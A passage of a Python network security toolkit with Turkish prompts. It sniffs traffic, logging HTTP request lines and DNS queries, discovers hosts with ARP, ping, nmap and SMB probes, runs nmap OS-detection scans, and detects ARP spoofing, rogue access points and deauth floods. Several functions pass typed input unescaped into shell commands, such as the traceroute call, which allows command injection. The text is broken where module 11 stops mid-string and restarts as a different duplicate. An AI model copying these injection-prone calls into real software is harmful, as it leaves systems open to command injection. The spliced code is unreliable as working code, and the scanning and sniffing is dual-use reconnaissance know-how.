    def analyze_packet(packet):
        stats['total'] += 1
        stats['bytes'] += len(packet)
        
        if packet.haslayer(ARP):
            stats['arp'] += 1
            arp = packet[ARP]
            stats['arp_packets'].append({
                'src_ip': arp.psrc, 'dst_ip': arp.pdst,
                'src_mac': arp.hwsrc, 'dst_mac': arp.hwdst,
                'op': 'request' if arp.op == 1 else 'reply'
            })
        
        if packet.haslayer(IP):
            ip_layer = packet[IP]
            stats['unique_ips'].add(ip_layer.src)
            stats['unique_ips'].add(ip_layer.dst)
            stats['ip_proto_count'][ip_layer.proto] += 1
            
            if packet.haslayer(TCP):
                stats['tcp'] += 1
                tcp = packet[TCP]
                stats['port_count'][tcp.sport] += 1
                stats['port_count'][tcp.dport] += 1
                
                if tcp.dport in (80, 8080, 8000) or tcp.sport in (80, 8080, 8000):
                    stats['http'] += 1
                    if packet.haslayer(Raw):
                        try:
                            payload = packet[Raw].load.decode('utf-8', errors='ignore')
                            for line in payload.split('\n'):
                                if line.startswith(('GET ', 'POST ', 'Host:', 'User-Agent:')):
                                    stats['urls'].append(line.strip()[:150])
                        except:
                            pass
                
                if tcp.dport == 443 or tcp.sport == 443:
                    stats['https'] += 1
            
            if packet.haslayer(UDP):
                stats['udp'] += 1
                udp = packet[UDP]
                stats['port_count'][udp.sport] += 1
                stats['port_count'][udp.dport] += 1
                
                if packet.haslayer(DNS):
                    stats['dns'] += 1
                    dns = packet[DNS]
                    if dns.qr == 0:
                        try:
                            qname = dns.qd.qname.decode('utf-8', errors='ignore')
                            stats['dns_queries'].append(qname)
                        except:
                            pass
                
                if packet.haslayer(DHCP):
                    stats['dhcp'] += 1
                    try:
                        if packet[DHCP].options:
                            for opt in packet[DHCP].options:
                                if isinstance(opt, tuple) and opt[0] == 'hostname':
                                    stats['dhcp_discover'].append(opt[1].decode('utf-8', errors='ignore'))
                    except:
                        pass
        
        if packet.haslayer(type=1):  # ICMP
            stats['icmp'] += 1
    
    duration_map = {'1': 30, '2': 60, '3': 30, '4': 30, '5': 30, '6': 60, '7': 0, '8': 20}
    duration = duration_map.get(choice, 30)
    
    # BPF filter
    bpf_map = {
        '2': 'tcp port 80 or tcp port 8080',
        '3': 'port 53',
        '4': 'port 67 or port 68',
        '5': 'arp',
        '6': 'tcp port 443',
        '8': 'icmp'
    }
    
    bpf_filter = bpf_map.get(choice, '')
    
    print(c(Colors.OKCYAN, f"\n[*] {'Sürekli' if duration == 0 else f'{duration}s'} dinleniyor..."))
    if bpf_filter:
        print(c(Colors.OKBLUE, f"    Filtre: {bpf_filter}"))
    
    try:
        if duration > 0:
            sniff(iface=interface, prn=analyze_packet, timeout=duration, 
                  store=0, filter=bpf_filter if bpf_filter else None)
        else:
            print(c(Colors.WARNING, "\n[*] Ctrl+C ile durdurun..."))
            sniff(iface=interface, prn=analyze_packet, store=0)
    except KeyboardInterrupt:
        pass
    
    elapsed = time.time() - start_time
    
    # RAPOR
    print(c(Colors.HEADER, f"\n{'='*70}"))
    print(c(Colors.BOLD, f"  AĞ ANALİZ RAPORU ({elapsed:.1f}s)"))
    print(c(Colors.HEADER, f"{'='*70}"))
    
    print(f"\n{c(Colors.OKBLUE)}📊 İSTATİSTİKLER")
    print(f"  Toplam: {stats['total']} paket | {stats['bytes']/1024:.1f} KB")
    print(f"  TCP: {stats['tcp']} | UDP: {stats['udp']} | ARP: {stats['arp']} | ICMP: {stats['icmp']}")
    print(f"  HTTP: {stats['http']} | HTTPS: {stats['https']} | DNS: {stats['dns']} | DHCP: {stats['dhcp']}")
    print(f"  Benzersiz IP: {len(stats['unique_ips'])} | Hız: {stats['total']/elapsed:.1f} pkt/s")
    
    # IP protokol dağılımı
    proto_names = {1: 'ICMP', 6: 'TCP', 17: 'UDP'}
    if stats['ip_proto_count']:
        print(f"\n{c(Colors.OKBLUE)}📋 PROTOKOL DAĞILIMI")
        for proto, count in stats['ip_proto_count'].most_common(5):
            pname = proto_names.get(proto, f'Proto-{proto}')
            print(f"  {pname}: {count} ({count/stats['total']*100:.1f}%)")
    
    # En çok kullanılan portlar
    if stats['port_count']:
        print(f"\n{c(Colors.OKBLUE)}🔌 EN ÇOK KULLANILAN PORTLAR")
        for (port, count) in stats['port_count'].most_common(10):
            service = {80: 'HTTP', 443: 'HTTPS', 53: 'DNS', 22: 'SSH', 
                      3389: 'RDP', 3306: 'MySQL', 8080: 'HTTP-Proxy'}.get(port, '')
            print(f"  Port {port}/{'tcp' if port < 1000 else ''}: {count} kez {service}")
    
    # DNS sorguları
    if stats['dns_queries']:
        print(f"\n{c(Colors.OKBLUE)}🌐 DNS SORGULARI ({len(set(stats['dns_queries']))})")
        for q in list(set(stats['dns_queries']))[:15]:
            print(f"  - {q}")
    
    # HTTP istekleri
    if stats['urls']:
        print(f"\n{c(Colors.OKBLUE)}🌍 HTTP İSTEKLERİ ({len(stats['urls'])})")
        for url in stats['urls'][:10]:
            print(f"  - {url}")
    
    # IP listesi
    if stats['unique_ips']:
        print(f"\n{c(Colors.OKBLUE)}🎯 TESPİT EDİLEN IP'LER")
        try:
            sorted_ips = sorted(stats['unique_ips'], key=lambda x: tuple(int(o) for o in x.split('.')))
        except:
            sorted_ips = sorted(stats['unique_ips'])
        for ip in sorted_ips[:20]:
            print(f"  - {ip}")
    
    report_mgr.add('Traffic_Monitor', {
        'interface': interface, 'duration': elapsed,
        'stats': {
            'total': stats['total'], 'tcp': stats['tcp'], 'udp': stats['udp'],
            'arp': stats['arp'], 'dns': stats['dns'], 'http': stats['http'],
            'unique_ips': list(stats['unique_ips'])[:50],
            'dns_queries': list(set(stats['dns_queries']))[:30]
        }
    })
    return stats

# ============================================================
# GUVENLIK MODUL 5: IP/Cihaz Keşfi (Gelişmiş)
# ============================================================

def sec_device_discovery():
    """Gelişmiş IP/cihaz keşfi"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S5] IP/CİHAZ KEŞFİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    network = input(c(Colors.OKCYAN, f"[?] Ağ (boş={get_local_network()}): "))
    if not network:
        network = get_local_network()
    
    print(c(Colors.OKCYAN, f"\n[*] Keşif yöntemleri:"))
    print("  1 - Hızlı ARP taraması")
    print("  2 - Ping sweep (ICMP)")
    print("  3 - Nmap ping sweep (-sn)")
    print("  4 - SMB keşfi (Windows cihazları)")
    print("  5 - MDNS/LLMNR keşfi")
    print("  6 - Tümü (kapsamlı)")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-6): "))
    
    devices = []
    
    if choice in ('1', '6'):
        print(c(Colors.OKCYAN, "\n[*] ARP taraması..."))
        ret, out, _ = run_command(f"arp-scan --localnet 2>/dev/null || "
                                  f"nmap -sn {network} 2>/dev/null")
        if ret == 0:
            for line in out.split('\n'):
                if '\t' in line:
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        devices.append({
                            'ip': parts[0].strip(),
                            'mac': parts[1].strip(),
                            'vendor': parts[2].strip() if len(parts) > 2 else ''
                        })
    
    if choice in ('2', '6'):
        print(c(Colors.OKCYAN, "[*] Ping sweep..."))
        net = ipaddress.ip_network(network, strict=False)
        active = []
        def ping(ip):
            if run_command(f"ping -c 1 -W 1 {ip}")[0] == 0:
                active.append(ip)
        threads = []
        for host in list(net.hosts())[:254]:
            t = threading.Thread(target=ping, args=(str(host),))
            threads.append(t); t.start()
            if len(threads) >= 50:
                for t2 in threads: t2.join()
                threads = []
        for t in threads: t.join()
        for ip in active:
            if not any(d['ip'] == ip for d in devices):
                devices.append({'ip': ip, 'mac': '', 'vendor': 'Ping yanıtı'})
    
    if choice in ('3', '6'):
        print(c(Colors.OKCYAN, "[*] Nmap ping sweep..."))
        ret, out, _ = run_command(f"nmap -sn {network} 2>/dev/null")
        for line in out.split('\n'):
            if 'Nmap scan report for' in line:
                ip = line.split()[-1].strip('()')
                if not any(d['ip'] == ip for d in devices):
                    devices.append({'ip': ip, 'mac': '', 'vendor': 'Nmap'})
    
    if choice in ('4', '6'):
        print(c(Colors.OKCYAN, "[*] SMB keşfi..."))
        smb_ips = []
        net = ipaddress.ip_network(network, strict=False)
        for host in list(net.hosts())[:254]:
            ip = str(host)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            if sock.connect_ex((ip, 445)) == 0:
                smb_ips.append(ip)
            sock.close()
        for ip in smb_ips:
            if not any(d['ip'] == ip for d in devices):
                devices.append({'ip': ip, 'mac': '', 'vendor': 'SMB (Windows/Linux)'})
    
    print(c(Colors.OKGREEN, f"\n[+] ✓ Toplam {len(devices)} cihaz bulundu:"))
    print("-" * 80)
    print(f"{'IP':<18} {'MAC':<20} {'Üretici':<35}")
    print("-" * 80)
    for d in sorted(devices, key=lambda x: tuple(int(o) for o in x['ip'].split('.'))):
        mac = d.get('mac', '') if d.get('mac') else 'N/A'
        vendor = d.get('vendor', '')[:35] if d.get('vendor') else ''
        print(f"{d['ip']:<18} {mac:<20} {vendor:<35}")
    
    report_mgr.add('Device_Discovery', {'network': network, 'devices': devices})
    return devices

# ============================================================
# GUVENLIK MODUL 6: ARP Spoofing Tespiti (Gelişmiş)
# ============================================================

def sec_arp_detection():
    """Gelişmiş ARP spoofing ve MITM tespiti"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S6] ARP SPOOFING & MITM TESPİTİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    interface = input(c(Colors.OKCYAN, "[?] Arayüz (boş=otomatik): "))
    if not interface:
        interfaces = get_all_interfaces()
        interface = interfaces[0] if interfaces else "eth0"
    
    duration = input(c(Colors.OKCYAN, "[?] Süre (saniye, boş=60): "))
    duration = int(duration) if duration else 60
    
    gateway = get_default_gateway()
    print(c(Colors.OKBLUE, f"\n[*] Gateway: {gateway}"))
    
    print(c(Colors.OKCYAN, f"[*] {duration}s ARP analizi başlatılıyor..."))
    print(c(Colors.WARNING, "[*] Şüpheli aktiviteler anında raporlanacak...\n"))
    
    try:
        from scapy.all import sniff, ARP
    except ImportError:
        print(c(Colors.FAIL, "[!] Scapy gerekli!"))
        return
    
    # Başlangıç ARP tablosu
    arp_table = {}
    alerts = []
    packet_count = [0]
    
    # İlk MAC'leri al
    ret, out, _ = run_command("ip neigh show")
    for line in out.split('\n'):
        if 'REACHABLE' in line or 'STALE' in line or 'DELAY' in line:
            parts = line.split()
            if len(parts) >= 5:
                ip = parts[0]
                mac = parts[4]
                arp_table[ip] = mac
    
    def detect_arp_spoof(packet):
        if packet.haslayer(ARP):
            packet_count[0] += 1
            arp = packet[ARP]
            
            if arp.op == 2:  # ARP reply
                ip = arp.psrc
                mac = arp.hwsrc
                
                if ip in arp_table:
                    if arp_table[ip] != mac:
                        alert = {
                            'type': 'ARP_SPOOF',
                            'ip': ip,
                            'old_mac': arp_table[ip],
                            'new_mac': mac,
                            'time': datetime.datetime.now().isoformat()
                        }
                        alerts.append(alert)
                        print(c(Colors.FAIL, 
                            f"\n[!] ⚠️ ARP SPOOFING TESPİTİ!"))
                        print(c(Colors.FAIL, 
                            f"    IP: {ip} | Eski: {arp_table[ip]} | Yeni: {mac}"))
                else:
                    arp_table[ip] = mac
                
                # Gateway kontrolü
                if ip == gateway:
                    gateway_macs = [m for i, m in arp_table.items() if i == gateway]
                    if len(set(gateway_macs)) > 1:
                        alert = {
                            'type': 'MITM_GATEWAY',
                            'gateway': gateway,
                            'macs': list(set(gateway_macs))
                        }
                        alerts.append(alert)
                        print(c(Colors.FAIL, 
                            f"\n[!] 🚨 GATEWAY MAC DEĞİŞİMİ! MITM OLABİLİR!"))
                        print(c(Colors.FAIL, f"    MAC'ler: {', '.join(set(gateway_macs))}"))
    
    try:
        sniff(iface=interface, prn=detect_arp_spoof, timeout=duration, store=0)
    except KeyboardInterrupt:
        pass
    
    print(f"\n{c(Colors.OKGREEN)}[+] İzleme tamamlandı!")
    print(f"  Toplam ARP paketi: {packet_count[0]}")
    print(f"  İzlenen IP-MAC: {len(arp_table)}")
    
    if alerts:
        print(c(Colors.FAIL, f"\n[!] {len(alerts)} tehdit tespit edildi!"))
        for a in alerts:
            print(f"  [{a['type']}] IP={a.get('ip', a.get('gateway', '?'))}")
    else:
        print(c(Colors.OKGREEN, "\n[+] ✓ ARP spoofing veya MITM tespit edilmedi!"))
    
    print(c(Colors.OKBLUE, "\n[*] Güncel ARP tablosu:"))
    print("-" * 50)
    print(f"{'IP':<18} {'MAC':<20}")
    print("-" * 50)
    for ip, mac in sorted(arp_table.items()):
        print(f"{ip:<18} {mac:<20}")
    
    report_mgr.add('ARP_Detection', {
        'interface': interface, 'duration': duration,
        'arp_table': arp_table, 'alerts': alerts
    })
    return alerts

# ============================================================
# GUVENLIK MODUL 7: Ağ Haritalama (Gelişmiş)
# ============================================================

def sec_network_mapping():
    """Gelişmiş ağ haritalama ve topoloji"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S7] AĞ HARİTALAMA & TOPOLOJİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    network = input(c(Colors.OKCYAN, f"[?] Ağ (boş={get_local_network()}): "))
    if not network:
        network = get_local_network()
    
    print(c(Colors.OKCYAN, "\n[*] Haritalama seçenekleri:"))
    print("  1 - Hızlı topoloji (bağlantılar + portlar)")
    print("  2 - Detaylı harita (OS tespiti + versiyon)")
    print("  3 - Traceroute haritası")
    print("  4 - Wi-Fi haritası (sinyal gücü)")
    print("  5 - Tam kapsamlı (en detaylı)")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-5): "))
    
    if choice == '3':
        target = input(c(Colors.OKCYAN, "[?] Traceroute hedefi (IP/domain): "))
        print(c(Colors.OKCYAN, f"\n[*] Traceroute: {target}"))
        os.system(f"traceroute -n {target} 2>/dev/null || traceroute {target}")
        return True
    
    if choice == '4':
        print(c(Colors.OKCYAN, "[*] WiFi haritası..."))
        nets, mon_iface = wifi_scan(get_wireless_interfaces()[0] if get_wireless_interfaces() else None)
        if nets:
            print(c(Colors.OKBLUE, "\n[*] Sinyal gücü haritası:"))
            for net in sorted(nets, key=lambda x: int(x.get('power', 0))):
                pwr = int(net.get('power', 0))
                bar_count = max(1, min(10, (pwr + 100) // 10))
                bars = '█' * bar_count + '░' * (10 - bar_count)
                color = Colors.OKGREEN if pwr >= -60 else (Colors.WARNING if pwr >= -75 else Colors.FAIL)
                print(f"  {color}{net['essid'][:25]:<25} {bars} ({net.get('power', 'N/A')} dBm)")
        return True
    
    # Nmap tabanlı haritalama
    nmap_cmds = {
        '1': f"nmap -sn -sS -T4 --top-ports 100 -O {network}",
        '2': f"nmap -sS -sV -O -T4 --top-ports 200 {network}",
        '5': f"nmap -sS -sV -O -A -T4 --top-ports 300 {network}"
    }
    
    cmd = nmap_cmds.get(choice, nmap_cmds['1'])
    
    print(c(Colors.OKCYAN, f"\n[*] Nmap haritalama: {network}"))
    print(c(Colors.WARNING, "[*] Bu işlem 3-5 dakika sürebilir...\n"))
    
    ret, out, _ = run_command(cmd, timeout=300)
    
    if out:
        print(c(Colors.OKBLUE, "\n" + "=" * 70))
        print(c(Colors.BOLD, "  AĞ TOPOLOJİSİ"))
        print(c(Colors.OKBLUE, "=" * 70))
        
        devices = []
        current = None
        
        for line in out.split('\n'):
            if 'Nmap scan report for' in line:
                ip = line.split()[-1].strip('()')
                current = {'ip': ip, 'mac': '', 'os': '', 'ports': [], 'vendor': ''}
                devices.append(current)
            elif current:
                if 'MAC Address:' in line:
                    parts = line.split('MAC Address: ')[1].split()
                    current['mac'] = parts[0]
                    current['vendor'] = ' '.join(parts[1:]).strip('()') if len(parts) > 1 else ''
                elif 'OS details:' in line:
                    current['os'] = line.split('OS details:')[1].strip()
                elif '/tcp' in line and 'open' in line:
                    current['ports'].append(line.strip())
        
        gateway = get_default_gateway()
        print(f"\n{c(Colors.WARNING)}🌐 GATEWAY: {gateway}")
        print(f"📍 AĞ: {network}")
        print(f"📡 CİHAZ: {len(devices)}")
        
        print(f"\n{c(Colors.OKCYAN)}📋 CİHAZ LİSTESİ")
        for i, dev in enumerate(devices, 1):
            print(f"\n  [{i}] {dev['ip']}")
            print(f"      MAC: {dev['mac'] or 'N/A'} ({dev.get('vendor', 'N/A')})")
            print(f"      OS: {dev['os'] or 'Tespit edilemedi'}")
            if dev['ports']:
                print(f"      Portlar: {', '.join(p.split('/')[0] for p in dev['ports'][:8])}")
        
        # ASCII topoloji
        print(f"\n{c(Colors.OKBLUE)}🔗 TOPOLOJİ ŞEMASI:")
        print(f'\n    🌐 İNTERNET')
        print(f'        ║')
        print(f'    🖥️  GATEWAY ({gateway})')
        print(f'        ║')
        print(f'    🔀 SWITCH / AP')
        print(f'        ╠══')
        for dev in devices[:12]:
            os_icon = '🖥️' if 'Linux' in dev.get('os','') or 'Windows' in dev.get('os','') else '📱'
            print(f'        ║  {os_icon} {dev["ip"]} ({dev.get("vendor", "?")[:20]})')
        if len(devices) > 12:
            print(f'        ║  ... +{len(devices)-12} cihaz')
        
        report_mgr.add('Network_Map', {
            'network': network, 'gateway': gateway, 'devices': devices
        })
    else:
        print(c(Colors.FAIL, "[!] Nmap çıktısı alınamadı!"))
    
    return True

# ============================================================
# GUVENLIK MODUL 8: Güvenlik Raporlama & Log Analizi
# ============================================================

def sec_reporting():
    """Gelişmiş güvenlik raporlama"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S8] GÜVENLİK RAPORLAMA & LOG ANALİZİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    print(c(Colors.OKCYAN, "\n[*] Seçenekler:"))
    print("  1 - Mevcut tarama özeti")
    print("  2 - JSON rapor kaydet")
    print("  3 - HTML rapor oluştur")
    print("  4 - Sistem log analizi (auth.log)")
    print("  5 - Başarısız giriş tespiti")
    print("  6 - Log özeti + anomali tespiti")
    print("  7 - Tüm raporları oluştur")
    
    choice = input(c(Colors.OKCYAN, "[?] Seçim (1-7): "))
    
    if choice == '1':
        print(report_mgr.summary())
    
    elif choice == '2':
        fn = input(c(Colors.OKCYAN, "[?] Dosya adı (boş=otomatik): "))
        report_mgr.save(fn if fn else None)
    
    elif choice == '3':
        fn = input(c(Colors.OKCYAN, "[?] HTML dosya adı: "))
        report_mgr.save_html(fn if fn else None)
    
    elif choice in ('4', '6'):
        log_files = ['/var/log/auth.log', '/var/log/syslog', '/var/log/kern.log',
                     '/var/log/ufw.log', '/var/log/apache2/access.log']
        security_events = []
        
        print(c(Colors.OKCYAN, "\n[*] Log analizi..."))
        
        for log_file in log_files:
            if os.path.exists(log_file):
                ret, out, _ = run_command(f"tail -n 200 {log_file} 2>/dev/null")
                
                for line in out.split('\n'):
                    keywords = ['failed', 'error', 'attack', 'invalid', 'unauthorized',
                               'denied', 'rejected', 'blocked', 'intrusion', 'malicious']
                    if any(k in line.lower() for k in keywords):
                        security_events.append((log_file, line[:150]))
        
        if security_events:
            print(c(Colors.FAIL, f"\n[!] {len(security_events)} güvenlik olayı:"))
            for log, event in security_events[-30:]:
                print(f"  [{os.path.basename(log)}] {event}")
        else:
            print(c(Colors.OKGREEN, "\n[+] Şüpheli aktivite bulunamadı."))
    
    if choice in ('5', '6'):
        print(c(Colors.OKCYAN, "\n[*] Başarısız giriş denemeleri..."))
        ret, out, _ = run_command("grep -i 'failed password' /var/log/auth.log 2>/dev/null | tail -30")
        
        if out.strip():
            print(c(Colors.FAIL, f"\n[!] Başarısız girişler tespit edildi!"))
            
            ip_pattern = re.compile(r'from\s+(\d+\.\d+\.\d+\.\d+)')
            ips = ip_pattern.findall(out)
            ip_counts = Counter(ips)
            
            print(c(Colors.WARNING, "\n[*] IP bazlı analiz:"))
            for ip, count in ip_counts.most_common(10):
                print(f"  {ip}: {count} deneme")
        else:
            print(c(Colors.OKGREEN, "[+] Başarısız giriş bulunamadı."))
    
    if choice == '7':
        fn_json = report_mgr.save()
        fn_html = report_mgr.save_html()
        print(c(Colors.OKGREEN, f"\n[+] Tüm raporlar oluşturuldu:"))
        print(f"    JSON: {fn_json}")
        print(f"    HTML: {fn_html}")
    
    return True

# ============================================================
# GUVENLIK MODUL 9: Sahte AP Tespiti
# ============================================================

def sec_rogue_ap_detection(interface: str = None):
    """Rogue AP ve Evil Twin tespiti"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S9] SAHTE AP (ROGUE/EVIL TWIN) TESPİTİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    if not interface:
        interfaces = get_wireless_interfaces()
        if not interfaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz bulunamadı!"))
            return False
        interface = interfaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return False
    
    print(c(Colors.OKCYAN, "\n[*] Çevredeki ağlar taranıyor (20 saniye)..."))
    nets, _ = wifi_scan(mon_iface, duration=20)
    
    if not nets:
        print(c(Colors.FAIL, "[!] Hiç ağ bulunamadı!"))
        disable_monitor_mode(mon_iface)
        return False
    
    print(c(Colors.OKCYAN, "\n[*] Sahte AP tespit kriterleri:"))
    print("  1 - Bilinen ağların kopyaları (Evil Twin)")
    print("  2 - Şüpheli BSSID (üretici MAC kontrolü)")
    print("  3 - Beklenmeyen kanal/şifreleme")
    print("  4 - Çok güçlü sinyal (yakında olmayan AP)")
    
    # Analiz
    suspicious = []
    known_bssids = set()
    bssid_counts = Counter()
    
    for net in nets:
        bssid = net['bssid']
        bssid_counts[bssid] += 1
    
    for net in nets:
        essid = net.get('essid', '')
        bssid = net['bssid']
        power = net.get('power', '0')
        channel = net.get('channel', '')
        privacy = net.get('privacy', '')
        
        reasons = []
        
        # Aynı SSID'ye sahip farklı BSSID kontrolü
        same_ssid = [n for n in nets if n.get('essid') == essid and n['bssid'] != bssid]
        if same_ssid:
            reasons.append(f"Aynı SSID'ye sahip {len(same_ssid)} farklı BSSID var")
        
        # MAC OUI kontrolü (bilinen üreticiler)
        oui = bssid[:8].upper()
        known_ouis = ['00:11:22', '00:1A:2B', '00:1E:58', '00:23:69', '00:26:CB',
                     'C0:4A:00', 'E0:1C:41', '00:24:01', 'D8:5D:E2']
        if oui not in known_ouis and not any(n['bssid'].startswith(oui) for n in nets):
            reasons.append(f"Bilinmeyen MAC OUI: {oui}")
        
        # WEP kontrolü
        if 'WEP' in privacy:
            reasons.append("WEP kullanıyor (güvensiz)")
        
        # Çok güçlü sinyal (Evil Twin olabilir)
        try:
            if int(power) >= -40:
                reasons.append("Çok güçlü sinyal")
        except:
            pass
        
        if reasons:
            suspicious.append({'net': net, 'reasons': reasons})
    
    # Rapor
    print(c(Colors.OKBLUE, f"\n{'='*70}"))
    print(c(Colors.BOLD, f"  SAHTE AP TESPİT RAPORU"))
    print(c(Colors.OKBLUE, f"{'='*70}"))
    
    if suspicious:
        print(c(Colors.FAIL, f"\n[!] {len(suspicious)} şüpheli AP tespit edildi!\n"))
        for s in suspicious:
            net = s['net']
            print(f"  {c(Colors.FAIL)}⚠️ {net.get('essid', '?')} ({net['bssid']}){c(Colors.ENDC)}")
            print(f"     Kanal: {net.get('channel', '?')} | Sinyal: {net.get('power', '?')} dBm")
            print(f"     Şifreleme: {net.get('privacy', '?')}")
            for r in s['reasons']:
                print(f"     → {c(Colors.WARNING)}{r}{c(Colors.ENDC)}")
            print()
    else:
        print(c(Colors.OKGREEN, "\n[+] ✓ Şüpheli AP tespit edilmedi."))
    
    print(c(Colors.OKBLUE, f"\n[*] Tüm ağlar ({len(nets)}):"))
    print(f"{'ESSID':<30} {'BSSID':<18} {'CH':<4} {'Güç':<6} {'Güvenlik':<12}")
    print("-" * 80)
    for net in sorted(nets, key=lambda x: x.get('power', '0')):
        essid = net.get('essid', '')[:28]
        pwr = net.get('power', 'N/A')
        mark = c(Colors.FAIL, '⚠️') if net in [s['net'] for s in suspicious] else '  '
        print(f"{mark} {essid:<28} {net['bssid']:<18} {net.get('channel','?'):<4} {str(pwr):<6} {net.get('privacy','?'):<12}")
    
    disable_monitor_mode(mon_iface)
    
    report_mgr.add('Rogue_AP_Detection', {
        'nets_found': len(nets),
        'suspicious': len(suspicious),
        'details': [(s['net'].get('essid',''), s['net']['bssid'], s['reasons']) for s in suspicious]
    })
    return suspicious

# ============================================================
# GUVENLIK MODUL 10: Deauth Saldırı Tespiti
# ============================================================

def sec_deauth_detection(interface: str = None):
    """Deauth saldırı tespit sistemi"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S10] DEAUTH SALDIRI TESPİTİ"))
    print(c(Colors.HEADER, "=" * 70))
    
    if not interface:
        interfaces = get_wireless_interfaces()
        if not interfaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz bulunamadı!"))
            return
        interface = interfaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return
    
    duration = input(c(Colors.OKCYAN, "[?] İzleme süresi (saniye, boş=60): "))
    duration = int(duration) if duration else 60
    
    print(c(Colors.OKCYAN, f"\n[*] {duration}s deauth analizi..."))
    print(c(Colors.WARNING, "[*] Yüksek frekansta deauth paketleri tespit edilecek...\n"))
    
    try:
        from scapy.all import sniff, Dot11, Dot11Deauth, RadioTap
    except ImportError:
        print(c(Colors.FAIL, "[!] Scapy gerekli!"))
        return
    
    deauth_events = []
    last_deauth_time = {}
    deauth_count = Counter()
    start_time = time.time()
    
    def detect_deauth(packet):
        if packet.haslayer(Dot11Deauth):
            src = packet.addr2
            dst = packet.addr1
            bssid = packet.addr3
            
            now = time.time()
            deauth_count[src] += 1
            deauth_count[f"dst_{dst}"] += 1
            
            # Rate limiting tespiti
            if src in last_deauth_time:
                interval = now - last_deauth_time[src]
                rate = 1.0 / interval if interval > 0 else float('inf')
                
                if rate > 5 and deauth_count[src] > 10:
                    event = {
                        'time': datetime.datetime.now().isoformat(),
                        'source': src,
                        'target': dst,
                        'bssid': bssid,
                        'rate': f"{rate:.1f} pkt/s",
                        'total': deauth_count[src]
                    }
                    
                    if src not in [e['source'] for e in deauth_events[-5:]]:
                        deauth_events.append(event)
                        print(c(Colors.FAIL, 
                            f"\n[!] 🚨 DEAUTH SALDIRISI!"))
                        print(c(Colors.FAIL, 
                            f"    Kaynak: {src} → Hedef: {dst}"))
                        print(c(Colors.FAIL, 
                            f"    Hız: {rate:.1f} pkt/s | Toplam: {deauth_count[src]}"))
            
            last_deauth_time[src] = now
    
    try:
        sniff(iface=mon_iface, prn=detect_deauth, timeout=duration, store=0)
    except KeyboardInterrupt:
        pass
    
    elapsed = time.time() - start_time
    
    print(f"\n{c(Colors.OKGREEN)}[+] İzleme tamamlandı ({elapsed:.1f}s)!")
    print(f"  Toplam deauth paketi: {sum(deauth_count.values())}")
    
    if deauth_events:
        print(c(Colors.FAIL, f"\n[!] {len(deauth_events)} deauth saldırı olayı!"))
        for e in deauth_events[-10:]:
            print(f"  Kaynak: {e['source']} → Hedef: {e['target']}")
            print(f"  Hız: {e['rate']} | Toplam: {e['total']}")
    else:
        print(c(Colors.OKGREEN, "\n[+] ✓ Deauth saldırısı tespit edilmedi!"))
    
    # En çok deauth gönderenler
    if deauth_count:
        print(c(Colors.OKBLUE, "\n[*] En çok deauth gönderen MAC'ler:"))
        for mac, count in deauth_count.most_common(10):
            if mac.startswith('dst_'):
                print(f"  Hedef: {mac[4:]}: {count}")
            else:
                print(f"  Kaynak: {mac}: {count}")
    
    disable_monitor_mode(mon_iface)
    
    report_mgr.add('Deauth_Detection', {
        'duration': elapsed,
        'total_deauth': sum(deauth_count.values()),
        'alerts': len(deauth_events),
        'top_sources': dict(deauth_count.most_common(10))
    })
    return deauth_events

# ============================================================
# GUVENLIK MODUL 11: Kanal Analizi & RF Tarama
# ============================================================

def sec_channel_analysis(interface: str = None):
    """Kanal analizi, sinyal gücü ve RF tarama"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S11] KANAL ANALİZİ & RF TARAMA"))
    print(c(Colors.HEADER, "=" * 70))
    
    if not interface:
        interfaces = get_wireless_interfaces()
        if not interfaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz bulunamadı!"))
            return
        interface = interfaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return
    
    print(c(Colors.OKCYAN, "\n[*] 2
# ============================================================
# GUVENLIK MODUL 11: Kanal Analizi & RF Tarama
# ============================================================

def sec_channel_analysis(interface: str = None):
    """Kanal analizi, sinyal gücü, gürültü ve RF tarama"""
    print(c(Colors.HEADER, "\n" + "=" * 70))
    print(c(Colors.BOLD, "  [S11] KANAL ANALİZİ & RF TARAMA"))
    print(c(Colors.HEADER, "=" * 70))
    
    if not interface:
        ifaces = get_wireless_interfaces()
        if not ifaces:
            print(c(Colors.FAIL, "[!] Kablosuz arayüz yok!"))
            return
        interface = ifaces[0]
    
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        return
    
    print(c(Colors.OKCYAN, "\n[*] 2.4 GHz kanalları taranıyor (1-13)..."))
    
    channel_stats = {}
    for ch in range(1, 14):
        run_command(f"iw dev {mon_iface} set channel {ch}")
        time.sleep(0.3)
        ret, out, _ = run_command(f"iw dev {mon_iface} survey dump 2>/dev/null | "
                                  f"grep -A 5 'in use' | tail -5")
        # Sinyal seviyesini iwconfig ile al
        ret2, out2, _ = run_command(f"iwconfig {mon_iface} 2>/dev/null | grep -i quality")
        channel_stats[ch] = {'survey': out[:100], 'signal': out2[:80]}
    
    print(c(Colors.OKCYAN, "\n[*] 5 GHz kanalları taranıyor (36-64)..."))
    for ch in range(36, 65, 4):
        run_command(f"iw dev {mon_iface} set channel {ch}")
        time.sleep(0.2)
        ret, out, _ = run_command(f"iwconfig {mon_iface} 2>/dev/null")
